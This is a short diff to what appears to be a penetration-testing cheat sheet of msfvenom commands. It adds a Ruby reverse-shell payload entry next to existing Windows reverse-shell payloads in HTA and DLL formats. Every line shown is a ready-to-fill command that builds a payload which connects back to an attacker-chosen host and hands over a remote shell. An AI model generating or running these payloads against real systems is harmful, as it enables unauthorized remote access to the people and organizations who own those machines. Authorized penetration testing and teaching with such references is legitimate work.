@@ -98,6 +98,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
+#### ➤ .RB (Ruby)
+```
+msfvenom --platform ruby -p ruby/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -o payload.rb
+```
+
 #### ➤ .SO
 
 reference : 
